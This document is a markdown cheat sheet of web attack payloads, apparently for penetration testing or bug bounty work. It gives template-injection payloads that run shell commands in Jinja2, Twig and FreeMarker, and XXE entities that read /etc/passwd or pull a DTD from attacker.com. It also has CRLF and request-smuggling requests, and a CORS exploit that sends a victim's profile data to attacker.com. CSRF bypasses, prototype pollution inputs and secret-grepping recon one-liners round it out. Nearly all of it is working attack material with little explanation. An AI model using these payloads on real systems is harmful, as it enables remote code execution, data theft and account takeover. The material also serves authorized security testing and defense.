# Misc Payloads

## SSTI — Server Side Template Injection

### Detection
```
{{7*7}}          → 49 = Jinja2/Twig
${7*7}           → 49 = Freemarker/EL
<%= 7*7 %>       → 49 = ERB (Ruby)
#{7*7}           → 49 = Ruby
*{7*7}           → 49 = Spring (SpEL)
{{7*'7'}}        → 7777777 = Jinja2
```

### Jinja2 RCE (Python)
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}
```

### Twig RCE (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### FreeMarker RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

---

## CRLF Injection
```
%0d%0aHeader: injected
%0aSet-Cookie: admin=true
/%0d%0aLocation: https://evil.com
?url=https://target.com%0d%0aSet-Cookie:%20admin=true
```

---

## XXE — XML External Entity
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Blind XXE — Out-of-Band
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root/>
```

### XXE via SVG Upload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## HTTP Request Smuggling

### CL.TE
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

---

## CORS Misconfiguration
```
# Test:
curl -H "Origin: https://evil.com" -I https://target.com/api/data

# Vulnerable if response contains:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### Exploit
```javascript
fetch('https://target.com/api/profile', {credentials:'include'})
  .then(r=>r.text())
  .then(d=>fetch('https://attacker.com/?d='+btoa(d)))
```

---

## Prototype Pollution
```javascript
// Detection
?__proto__[test]=testvalue
?constructor[prototype][test]=testvalue
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
```

---

## CSRF Bypass

### Bypass SameSite=Lax
```html
<!-- Top-level navigation GET -->
<a href="https://target.com/action?param=malicious">Click</a>
<meta http-equiv="refresh" content="0;url=https://target.com/action?csrf_token=STOLEN">
```

### Bypass Token Validation
```
# Remove token entirely
# Use empty token: csrf=
# Use same token from another account
# Change request method POST→GET
```

---

## Subdomain Takeover — Common Fingerprints
```
GitHub Pages     → There isn't a GitHub Pages site here
Heroku           → No such app
Shopify          → Sorry, this shop is currently unavailable
AWS S3           → NoSuchBucket
Fastly           → Fastly error: unknown domain
Zendesk          → Help Center Closed
```

---

## Recon One-Liners
```bash
# Subdomain enum
subfinder -d target.com | httpx -silent | tee live.txt

# Param discovery
katana -u https://target.com | grep "=" | qsreplace FUZZ

# JS secret finder
cat js_files.txt | xargs -I{} curl -s {} | grep -Eo '(api_key|secret|token|password|api)["\s:=]+["\w]+'

# Find open redirects
cat urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -location
```
